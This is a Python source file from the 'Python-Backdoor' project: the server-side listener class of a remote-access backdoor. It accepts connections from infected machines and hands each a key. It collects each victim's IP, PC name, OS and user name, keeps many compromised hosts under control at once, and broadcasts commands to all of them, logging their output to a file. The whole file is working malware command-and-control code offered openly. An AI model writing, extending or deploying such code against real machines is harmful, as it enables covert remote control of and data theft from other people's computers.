"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import socket
from threading import Thread

from src import helper, errors
from src.encrypted_socket import EncryptedSocket
from src.defs import *


class Socket(EncryptedSocket):
    def __init__(self, port):
        super().__init__()

        self.conn_info = None
        self.thread_accept = None
        self.port = port
        self.connections = []
        self.addresses = []

        self.new_key()

        self.listener = socket.socket()
        self.socket = None  # socket for a connection

        try:
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # reuse a socket even if its recently closed
        except socket.error as e:
            print(f"Error creating socket {e}")
            sys.exit(0)

    def clear_curr(self):
        self.socket = None
        self.conn_info = None

    def listen_asych(self):
        def bind():
            try:
                self.listener.bind(("0.0.0.0", self.port))
                self.listener.listen(20)
            except socket.error() as strError:
                print(f"Error binding socket {strError}")
                bind()

        bind()

        print(f"Listening on port {self.port}")

        def socket_accept():
            while True:
                try:
                    self.socket, address = self.listener.accept()
                    self.socket.setblocking(True)  # no timeout

                    # first command is always the unencrypted key
                    self.send_json(CLIENT_KEY, self.key, False)

                    while True:
                        # wait for handshake
                        response = self.recv_json()
                        if response["key"] == CLIENT_HANDSHAKE:
                            break

                    address += tuple(response["value"])
                    self.connections.append(self.socket)
                    self.addresses.append(address)
                    print(f"\nConnection has been established: {address[0]} ({address[2]})")
                except socket.error as err:
                    print(f"Error accepting connection {err}")
                    continue

        self.thread_accept = Thread(target=socket_accept)
        self.thread_accept.daemon = True
        self.thread_accept.start()

    def close_clients(self):
        if len(self.connections) > 0:
            for _, self.socket in enumerate(self.connections):
                try:
                    self.send_json(CLIENT_EXIT)
                    self.socket.close()
                except socket.error:
                    pass
        else:
            print("No active connections")

        del self.connections
        del self.addresses
        self.connections = []
        self.addresses = []

        self.clear_curr()

    def close_one(self, index):
        try:
            self.select(index)
            self.socket.close()
        except socket.error:
            pass
        except errors.ServerSocket.InvalidIndex as e:
            print(e)
            return

        del self.addresses[index]
        del self.connections[index]

        self.clear_curr()

    def refresh(self):
        for _, self.socket in enumerate(self.connections):
            try:
                self.send_json(CLIENT_HEARTBEAT)
            except socket.error:
                del self.addresses[self.connections.index(self.socket)]
                self.connections.remove(self.socket)
                self.socket.close()

    def list(self):
        if len(self.connections) == 0:
            print("No active connections")
        else:
            clients = ""

            for i, address in enumerate(self.addresses):
                clients += f"{i}"
                for value in address:
                    clients += f"{4 * ' '}{str(value)}"
                clients += "\n"

            info = f"\nID{3 * ' '}"
            for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
                info += helper.center(f"{self.addresses[0][index]}", text) + 4 * " "
            info += f"\n{clients}"
            print(info, end="")

    def select(self, connection_id):
        try:
            connection_id = int(connection_id)
            self.socket = self.connections[connection_id]
        except Exception:
            raise errors.ServerSocket.InvalidIndex(f"No connection found with index {connection_id}")
        else:
            '''
            IP, PC Name, OS, User
            '''
            self.conn_info = tuple()
            for index in [0, 2, 3, 4]:
                self.conn_info += (f"{self.addresses[connection_id][index]}",)

    def send_all_connections(self, key, value, recvall=False):
        if len(self.connections) > 0:
            if os.path.isfile("command_log.txt"):
                file = open("command_log.txt", "a")
            else:
                file = open("command_log.txt", "w")

            for _, self.socket in enumerate(self.connections):
                try:
                    self.send_json(key, value)
                except socket.error:
                    continue

                if recvall:
                    output = self.recvall(self.recv_json()["value"]).decode()
                else:
                    output = self.recv_json()["value"]

                out = f"{24 * '='}\n{self.conn_info[0]}{4 * ' '}{self.conn_info[1]}{output}{24 * '='}\n\n"

                file.write(out)

            file.close()
        else:
            print("No active connections")

